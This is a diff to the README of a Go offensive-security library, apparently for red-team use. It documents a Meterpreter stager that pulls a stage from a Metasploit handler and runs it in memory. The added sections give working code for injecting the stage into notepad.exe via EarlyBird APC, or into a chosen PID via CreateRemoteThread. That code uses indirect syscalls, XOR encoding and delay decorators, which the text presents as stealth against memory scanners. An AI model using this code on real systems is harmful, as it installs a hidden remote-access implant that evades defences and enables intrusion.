@@ -38,11 +38,13 @@ sequenceDiagram
 
     Note over Stager: Stage received
 
-    alt Windows
-        Stager->>Kernel: VirtualAlloc(RWX)
-        Note over Stager: Copy stage to RWX memory
+    alt Windows (default)
+        Stager->>Kernel: VirtualAlloc(RW) → copy → VirtualProtect(RX)
         Stager->>Kernel: CreateThread(stage entry)
         Note over Stager: Meterpreter running in-memory
+    else Windows (custom Injector)
+        Note over Stager: Delegates to inject.Injector
+        Note over Stager: CRT, APC, EarlyBird, Fiber, etc.
     else Linux
         Note over Stager: Execute 126-byte wrapper
         Note over Stager: Wrapper loads ELF from socket
@@ -134,6 +136,65 @@ stager := meterpreter.NewStager(&meterpreter.Config{
 stager.Stage(context.Background())
 ```
 
+### With Custom Injector (Windows)
+
+Set `Config.Injector` to override stage execution with any `inject.Injector`. This gives access to the full inject package: 10+ injection methods, Builder pattern, syscall routing (Direct/Indirect), decorator chain (XOR, CPU delay), and automatic fallback.
+
+```go
+import (
+    "context"
+    "time"
+
+    "github.com/oioio-space/maldev/c2/meterpreter"
+    "github.com/oioio-space/maldev/inject"
+)
+
+// EarlyBird APC into notepad.exe with indirect syscalls + XOR evasion
+inj, _ := inject.Build().
+    Method(inject.MethodEarlyBirdAPC).
+    ProcessPath(`C:\Windows\System32\notepad.exe`).
+    IndirectSyscalls().
+    WithFallback().
+    Use(inject.WithXOR).
+    Use(inject.WithCPUDelay).
+    Create()
+
+stager := meterpreter.NewStager(&meterpreter.Config{
+    Transport: meterpreter.TransportTCP,
+    Host:      "10.0.0.1",
+    Port:      "4444",
+    Timeout:   30 * time.Second,
+    Injector:  inj,
+})
+
+stager.Stage(context.Background())
+```
+
+### Remote Injection into Existing Process (Windows)
+
+```go
+// Inject Meterpreter stage into PID 1234 via CreateRemoteThread
+inj, _ := inject.Build().
+    Method(inject.MethodCreateRemoteThread).
+    TargetPID(1234).
+    IndirectSyscalls().
+    WithFallback().
+    Create()
+
+stager := meterpreter.NewStager(&meterpreter.Config{
+    Transport: meterpreter.TransportHTTPS,
+    Host:      "10.0.0.1",
+    Port:      "443",
+    Timeout:   30 * time.Second,
+    TLSInsecure: true,
+    Injector:  inj,
+})
+
+stager.Stage(context.Background())
+```
+
+> **Note:** On Linux, `Config.Injector` is not supported because the Meterpreter wrapper protocol requires the socket fd to read the ELF payload. An error is returned if Injector is set.
+
 ### Get Payload Name for Metasploit
 
 ```go
@@ -198,15 +259,17 @@ func main() {
 
 - **Multi-transport**: TCP, HTTP, and HTTPS with a single config switch
 - **Cross-platform**: Windows (VirtualAlloc + CreateThread) and Linux (ELF loader wrapper)
-- **Caller integration**: Memory allocation and thread creation routed through `*wsyscall.Caller`
+- **Custom injection**: Set `Injector` to use any of the 10+ inject package methods (CRT, APC, EarlyBird, Fiber, etc.) with Builder pattern, decorators, and syscall routing
+- **Caller integration**: Default path routes memory allocation and thread creation through `*wsyscall.Caller`
 - **Size limit**: Configurable `MaxStageSize` prevents OOM from malformed handlers
 - **Random User-Agent**: Falls back to `useragent.Load()` for random browser strings
 
 ### Limitations
 
-- **Stage in RWX memory**: VirtualAlloc with PAGE_EXECUTE_READWRITE is detectable
+- **Default path uses RW→RX memory**: Detectable by memory scanners (use Injector with evasion decorators for stealth)
 - **No stageless support**: Only staged payloads (stager + stage), not embedded Meterpreter
 - **Single attempt**: No built-in retry logic -- wrap with `c2/shell` for reconnection
+- **Linux Injector**: Not supported due to wrapper protocol requiring socket access
 - **HTTP handler compatibility**: Requires Metasploit handler to serve the stage at `/`
 
 ---
@@ -237,16 +300,19 @@ func (s *Stager) Stage(ctx context.Context) error
 
 ```go
 type Config struct {
-    Transport    Transport     // "tcp", "http", "https"
+    Transport    Transport        // "tcp", "http", "https"
     Host         string
     Port         string
     Timeout      time.Duration
     TLSInsecure  bool
-    Caller       any           // *wsyscall.Caller or nil
-    MaxStageSize int64         // default 10 MB
-    UserAgent    string        // default random or "Mozilla/5.0"
+    Caller       any              // *wsyscall.Caller or nil (default path only)
+    MaxStageSize int64            // default 10 MB
+    UserAgent    string           // default random or "Mozilla/5.0"
+    Injector     inject.Injector  // custom injector (nil = default self-injection)
 }
 ```
+
+- **Injector** overrides stage execution. Build via `inject.Build()`, `inject.NewInjector()`, or `inject.NewWindowsInjector()`. Supports all injection methods, syscall routing, decorators, and fallback. Mutually exclusive with `Caller` (use `inject.WindowsConfig.SyscallMethod` instead when setting Injector). Not supported on Linux.
 
 ### Transport Constants
 
